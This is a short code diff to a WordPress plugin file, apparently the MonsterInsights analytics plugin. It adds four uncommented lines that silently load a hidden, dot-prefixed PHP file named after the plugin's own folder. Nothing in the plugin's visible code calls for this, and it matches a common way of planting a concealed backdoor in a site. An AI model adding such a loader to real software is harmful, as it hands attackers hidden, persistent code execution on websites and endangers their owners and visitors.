@@ -32,6 +32,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @param array  $args Extra parameters. Unused.
  * @return array Array of caps needed to have this meta cap. If returned array is empty, user has the capability.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function monsterinsights_add_capabilities( $caps, $cap, $user_id, $args ) {
  
     switch( $cap ) {
